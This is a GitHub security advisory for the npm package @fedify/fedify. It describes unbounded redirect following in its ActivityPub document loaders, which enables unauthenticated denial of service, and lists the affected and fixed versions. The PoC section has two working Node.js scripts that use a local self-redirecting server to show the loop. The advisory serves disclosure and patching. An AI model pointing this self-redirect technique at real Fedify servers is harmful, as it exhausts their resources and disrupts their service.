# [H] Fedify affected by resource exhaustion caused by unbounded redirect following during remote key/document resolution

## Summary
Severity: High
Advisory: GHSA-gm9m-gwc4-hwgp
CVE: CVE-2026-34148
CWE: CWE-400, CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-07
Source: https://github.com/advisories/GHSA-gm9m-gwc4-hwgp
Type: github-advisory

## Affected
- npm: `@fedify/fedify` — affected >=0 <1.9.6
- npm: `@fedify/vocab-runtime` — affected >=0 <2.0.8
- npm: `@fedify/vocab-runtime` — affected >=2.1.0 <2.1.1
- npm: `@fedify/fedify` — affected >=1.10.0 <1.10.5
- npm: `@fedify/fedify` — affected >=2.0.0 <2.0.8
- npm: `@fedify/fedify` — affected >=2.1.0 <2.1.1

## Details
### Summary

`@fedify/fedify` follows HTTP redirects recursively in its remote document loader and authenticated document loader without enforcing a maximum redirect count or visited-URL loop detection. An attacker who controls a remote ActivityPub key or actor URL can force a server using Fedify to make repeated outbound requests from a single inbound request, leading to resource consumption and denial of service.

### Details

Fedify verifies ActivityPub HTTP signatures by fetching the remote `keyId` during request processing. The relevant flow is `handleInboxInternal()` -> `verifyRequest()` -> `fetchKeyInternal()` -> document loader.

In affected versions:
- the generic document loader recursively follows `3xx` responses by calling `load()` again on the `Location` header
- the authenticated redirect path (`doubleKnock()`) also recursively follows redirects
- neither path enforces a redirect cap or tracks visited URLs to detect self-referential redirect loops

As a result, if an attacker-controlled `keyId` or actor URL responds with `302 Location: <same URL>`, a single ActivityPub request can trigger tens or hundreds of outbound requests before the fetch completes or the request times out.

I confirmed the issue in `@fedify/fedify` 1.9.1 and 1.9.2. By contrast, Fedify's WebFinger lookup path already has a redirect cap, which suggests the missing bound in the document loader is unintended.

Failed key fetches are not durably negatively cached. After a failed lookup, the null result is only remembered in a request-local cache, so later requests can trigger the same redirect loop again for the same `keyId`.

### PoC

Minimal direct reproduction with the package:

1. Install `@fedify/fedify@1.9.2`.
2. Save and run the following script:

```js
import http from "node:http";
import { getDocumentLoader } from "@fedify/fedify";

const port = 45679;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) => {
  count += 1;

  if (count < redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) => server.listen(port, "127.0.0.1", resolve));

try {
  const loader = getDocumentLoader({ allowPrivateAddress: true });
  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
```

3. Observe output similar to:

```
{ count: 120 }
```

This shows the loader followed 119 self-redirects before the first non-redirect response.

The authenticated loader used for signed requests shows the same behavior:

```
import http from "node:http";
import {
  generateCryptoKeyPair,
  getAuthenticatedDocumentLoader,
} from "@fedify/fedify";

const port = 45680;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) => {
  count += 1;

  if (count < redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) => server.listen(port, "127.0.0.1", resolve));

try {
  const { privateKey } = await generateCryptoKeyPair();
  const loader = getAuthenticatedDocumentLoader(
    {
      privateKey,
      keyId: new URL("https://example.com/users/index#main-key"),
    },
    { allowPrivateAddress: true },
  );

  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
```

### Impact

This is an unauthenticated denial-of-service / request amplification issue. Any Fedify-based server that verifies remote keys or loads remote ActivityPub documents can be forced to spend CPU time, worker time, connection slots, and outbound bandwidth following attacker-controlled redirects. A single inbound request can trigger a large number of outbound requests, and the attack can be repeated across requests because failed lookups are not durably negatively cached.

### Misc Notes

This issue was surfaced by a Ghost ActivityPub user reporting the issue directly to Ghost. The above report was generated upon further investigation into the issue by the Ghost team. We credit @wrathsec for the discovery.

## References
- https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp
- https://nvd.nist.gov/vuln/detail/CVE-2026-34148
- https://github.com/fedify-dev/fedify
- https://github.com/fedify-dev/fedify/releases/tag/1.10.5
- https://github.com/fedify-dev/fedify/releases/tag/1.9.6
- https://github.com/fedify-dev/fedify/releases/tag/2.0.8
- https://github.com/fedify-dev/fedify/releases/tag/2.1.1
